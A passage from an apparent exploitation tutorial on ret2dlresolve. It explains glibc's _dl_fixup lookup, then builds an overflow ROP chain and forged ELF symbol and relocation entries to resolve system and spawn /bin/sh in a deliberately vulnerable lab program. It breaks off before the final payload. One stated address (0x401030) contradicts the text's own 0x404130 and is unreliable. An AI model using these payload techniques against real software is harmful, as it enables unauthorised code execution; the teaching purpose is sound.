<p>Then it checks the <a href="https://docs.oracle.com/cd/E19683-01/816-1386/6m7qcoblj/index.html#chapter7-27" target="_blank" rel="noopener noreferrer">visibility</a> of the symbol, which determines how and where symbols are accessible from. We don&#x27;t need to worry about this for now, as most symbols have <code>STV_DEFAULT=0</code>, and so will pass this check. There&#x27;s also some shenanigans with the version, which we don&#x27;t really care about.</p>
<figure><img src="/assets/image (238).png" alt=""><figcaption><p>Lookup symbol</p></figcaption></figure>
<p>Then it does the actual lookup using <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L835" target="_blank" rel="noopener noreferrer">_dl_lookup_symbol_x</a>, offsetting into strtab to get the name as mentioned earlier: <code>strtab + sym-&gt;st_name</code>.</p>
<p>The details of the actual lookup isn&#x27;t too important to us, but to summarise it:</p>
<ol>
<li>It <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L859" target="_blank" rel="noopener noreferrer">iterates through each link map</a> in <code>l</code>&#x27;s scope (<code>l-&gt;l_scope</code>).</li>
<li>For each link map, <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L408" target="_blank" rel="noopener noreferrer">lookup the symbol name in a hash table</a>.</li>
<li>For each hit, verify it&#x27;s the correct symbol using <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-lookup.c#L59" target="_blank" rel="noopener noreferrer">check_match</a>.</li>
<li>If it is, write the symbol to <code>&amp;sym</code> (this would be from the object&#x27;s <code>.symtab</code>, so it would contain the offset in <code>st_value</code>) and return the corresponding link map in <code>result</code>.</li>
</ol>
<p>Then it <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/generic/ldsodefs.h#L99" target="_blank" rel="noopener noreferrer">rebases the symbol</a> using <code>result</code> to get the address of the function in <code>value</code> (i.e. adds <code>l-&gt;l_addr</code> onto <code>st_value</code>).</p>
<figure><img src="/assets/image (239).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/dl-runtime.c#L158">Return value</a></p></figcaption></figure>
<figure><img src="/assets/image (240).png" alt=""><figcaption><p><a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/sysdeps/x86_64/dl-machine.h#L224">Write value to GOT entry</a></p></figcaption></figure>
<p>Skipping forward to the end, we finally return <code>value</code> and write it into the GOT entry (<code>rel_addr</code>).</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="attack-idea">Attack idea<a href="#attack-idea" class="hash-link" aria-label="Direct link to Attack idea" title="Direct link to Attack idea">​</a></h3>
<p>Now that we have an idea of how the resolving process works, let&#x27;s go back to the dispatcher: <code>0x1020</code>. This is the gadget that kickstarts the whole thing, and we can consider it like a function which takes one argument on the stack: <code>reloc_arg</code>.</p>
<p>Each PLT function is just a wrapper which provide a unique <code>reloc_arg</code>, so by changing <code>reloc_arg</code>, we can decide which function in the PLT we want to call:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">flat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token number" style="color:#36acaa">0x1020</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    reloc_arg</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    return_address</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>This allows us to call <code>_dl_fixup</code> with an arbitrary <code>reloc_arg</code>, and thinking back to <code>_dl_fixup</code>, we can notice that there&#x27;s no bounds check on <code>reloc_arg</code>! This means that if we place our own <code>Elf64_Rela</code> object in memory (relative to <code>DT_JMPREL</code>), then we could reference it, thus potentially forcing <code>_dl_fixup</code> to resolve an arbitrary symbol, such as <code>system</code>!</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="attack-demo">Attack demo<a href="#attack-demo" class="hash-link" aria-label="Direct link to Attack demo" title="Direct link to Attack demo">​</a></h3>
<div class="language-c codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">vuln.c</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-c codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token macro property directive-hash" style="color:#36acaa">#</span><span class="token macro property directive keyword" style="color:#00009f">include</span><span class="token macro property" style="color:#36acaa"> </span><span class="token macro property string" style="color:#e3116c">&lt;unistd.h&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">int</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">char</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">0x80</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">read</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> buf</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x200</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre></div></div>
<p>For this demo, the above program is compiled with glibc 2.31 (so we still have <code>pop rdi ; ret</code> :)):</p>
<figure><img src="/assets/image (8).png" alt=""><figcaption></figcaption></figure>
<figure><img src="/assets/image (9).png" alt=""><figcaption></figcaption></figure>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>To compile for an older libc, we can use dockerfile to get an older version of <code>gcc</code>:</p><div class="language-docker codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">Dockerfile</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-docker codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">FROM ubuntu:20.04</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">RUN apt-get update &amp;&amp; apt-get install -y gcc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WORKDIR /mnt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ENTRYPOINT gcc vuln.c -o vuln -no-pie -fno-stack-protector</span><br></span></code></pre></div></div><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_OeMC">build_docker.sh</div><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">#!/bin/bash</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker build -t ubuntu_20 .</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">docker run -v $PWD/:/mnt/ -it ubuntu_20</span><br></span></code></pre></div></div><p>To get the libc and ld, we can use libc-database, or just copy them from the docker into the shared folder <code>/mnt/</code>:</p><div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cp /usr/lib/x86_64-linux-gnu/libc-2.31.so /mnt/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cp /usr/lib/x86_64-linux-gnu/ld-2.31.so /mnt/</span><br></span></code></pre></div></div><p>TODO: Add alternative for compiling with old libc</p></div></div>
<p>For this exploit, we&#x27;ll use ret2dlresolve to resolve <code>system</code> to call <code>system(&quot;/bin/sh&quot;)</code>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="arbitrary-write">Arbitrary write<a href="#arbitrary-write" class="hash-link" aria-label="Direct link to Arbitrary write" title="Direct link to Arbitrary write">​</a></h4>
<p>We have the obvious overflow, but can we do with it? There&#x27;s no functions for printing data back to us, so we can&#x27;t get a libc leak. We only have one function as well: <code>read</code>, so let&#x27;s consider what we can do with it.</p>
<p>We can see that after the <code>read</code> call, the arguments are preserved:</p>
<figure><img src="/assets/image (23).png" alt=""><figcaption><p>Before <code>read</code></p></figcaption></figure>
<figure><img src="/assets/image (24).png" alt=""><figcaption><p>After <code>read</code></p></figcaption></figure>
<p>Which happens because the <code>read</code> function is a just a &quot;thin&quot; wrapper around the <code>read</code> syscall, so there&#x27;s no need to move these arguments around.</p>
<p>This is convenient for us, as controlling <code>rdx</code> is more of a hassle than <code>rdi</code> and <code>rsi</code> (however it can be done with <code>ret2csu</code>), so we can just use the existing <code>size=0x200</code> argument (and <code>fd=0</code>), while changing <code>rsi</code> to point wherever we want, thus granting arbitrary write.</p>
<p>For ret2dlresolve, we&#x27;ll write <code>Elf64_Rela</code> and other necessary objects into the binary&#x27;s memory to prepare to resolve arbitrary functions, so let&#x27;s write the rop chain first to do this:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pop_rdi </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4011c3</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pop_rsi_r15 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4011c1</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dispatcher </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x401020</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># address to writable &quot;scratch&quot; memory</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop  </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;A&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x80</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># saved rbp</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">pop_rsi_r15</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">writable</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rop </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sym</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">read</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<p>Now for the ret2dlresolve objects!</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="contructing-objects">Contructing objects<a href="#contructing-objects" class="hash-link" aria-label="Direct link to Contructing objects" title="Direct link to Contructing objects">​</a></h4>
<p>On this 2nd <code>read</code>, we&#x27;ll send a blob containing all of the objects we need to resolve a symbol, which for us will be <code>system</code> (however it works the same for any symbol!).</p>
<p>To recap, these objects will be:</p>
<ul>
<li><code>Elf64_Rela</code> (relocation table entry).</li>
<li><code>Elf64_Sym</code> (symbol table entry).</li>
<li>Name of symbol: <code>&quot;system\x00&quot;</code>.</li>
</ul>
<p>Organising these objects need to go can be fiddly, as there&#x27;s multiple considerations, such as objects will reference other ones: <code>Rela -&gt; Sym -&gt; Name</code>.</p>
<p>Another is alignment, since the symbol table and relocation table are indexed from their corresponding starting addresses, and each entry is size <code>0x18</code>, we&#x27;ll need to line up our objects properly.</p>
<p>We can find the addresses of these with <code>readelf -Wd ./vuln</code>:</p>
<figure><img src="/assets/Screenshot 2025-07-12 220401.png" alt=""><figcaption></figcaption></figure>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Another way using pwntools is:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DT_SYMTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> e</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">dynamic_value_by_tag</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&quot;DT_SYMTAB&quot;</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div></div></div>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DT_SYMTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4003c0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DT_STRTAB </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x400420</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">DT_JMPREL </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x4004b8</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">writable </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x404100</span><br></span></code></pre></div></div>
<p><code>writable</code> will be the starting address, and let&#x27;s start our blob with a <code>Elf64_Sym</code> entry. The size of this object is <code>0x18</code>, so our object needs to be 0x18-aligned with the start of the symbol table (<code>DT_SYMTAB</code>), i.e. <code>(addrof_sym - DT_SYMTAB) % 0x18 == 0</code>.</p>
<p>Since <code>(0x404100 - 0x4003c0) % 0x18 == 8</code>, we need to add <code>0x10</code> bytes of padding to the start, so <code>addrof_sym = 0x404110</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 0x404100: padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;\x00&quot;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x10</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 0x404110: Elf64_Sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0xdeadbeef</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic"># st_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x12</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">      </span><span class="token comment" style="color:#999988;font-style:italic"># st_info (global(0x10)|function(0x2))</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p8</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">         </span><span class="token comment" style="color:#999988;font-style:italic"># st_other</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p16</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># st_shndx</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># st_value</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic"># st_size</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>Most fields here aren&#x27;t too relevant, and we can just borrow from other <em>dynamic</em> symbol entries:</p><ul>
<li><code>st_info=0x12</code> indicates it&#x27;s global (can be referenced anywhere) and a function.</li>
<li><code>st_other=0</code> indicates that the visibility is <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/elf/elf.h#L624" target="_blank" rel="noopener noreferrer">STV_DEFAULT</a>.</li>
<li><code>st_shndx</code>, <code>st_value</code>,<code>st_size</code> don&#x27;t matter for a dynamic symbol (these aren&#x27;t checked as far as I can see).</li>
</ul></div></div>
<p>Note that we don&#x27;t know what <code>st_name</code> should be yet, so we&#x27;ll fill that field in later when we add that string.</p>
<p>Let&#x27;s do the same with <code>Elf64_Rela</code>:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 0x404130: Elf64_Rela</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0x404080</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">    </span><span class="token comment" style="color:#999988;font-style:italic"># r_offset</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">7</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.type</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p32</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_sym </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">//</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">   </span><span class="token comment" style="color:#999988;font-style:italic"># r_info.sym</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> p64</span><span class="token punctuation" style="color:#393A34">(</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">           </span><span class="token comment" style="color:#999988;font-style:italic"># r_addend</span><br></span></code></pre></div></div>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><ul>
<li><code>r_offset = 0x404080</code> will be where the function address is written to afterwards. This isn&#x27;t important, as long as it is writable.</li>
<li><code>r_info.type = 7 (ELF_MACHINE_JMP_SLOT)</code> indicates that this is a GOT entry (i.e. a function entry).</li>
<li><code>r_info.sym</code> references the symbol table entry we created earlier.</li>
<li><code>r_addend</code> is typically unused on <code>x86_64</code>, however we may as well set this to <code>0</code></li>
</ul></div></div>
<p>So <code>addrof_rela = 0x401030</code>, and since <code>Elf64_Rela</code> is also <code>0x18</code> bytes, we can verify this is 0x18-aligned with the start of the relocation table (<code>DT_JMPREL</code>).</p>
<p>Now we need to add the symbol name. This doesn&#x27;t need any special alignment, so just append it onto the end:</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 0x404148: st_name</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">payload </span><span class="token operator" style="color:#393A34">+=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">b&quot;system\x00&quot;</span><br></span></code></pre></div></div>
<p>Now that we know <code>addrof_st_name = 0x404148</code>, we can calculate <code>st_name</code>&#x27;s offset as <code>addrof_st_name - DT_STRTAB</code>.</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>info</div><div class="admonitionContent_BuS1"><p>We can also verify, for the sake of our sanity, that the objects are aligned:</p><div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_sym </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_SYMTAB</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">assert</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">addrof_rela </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> DT_JMPREL</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">%</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x18</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">==</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><br></span></code></pre></div></div></div></div>
<p>Now we can finally calculate:</p>
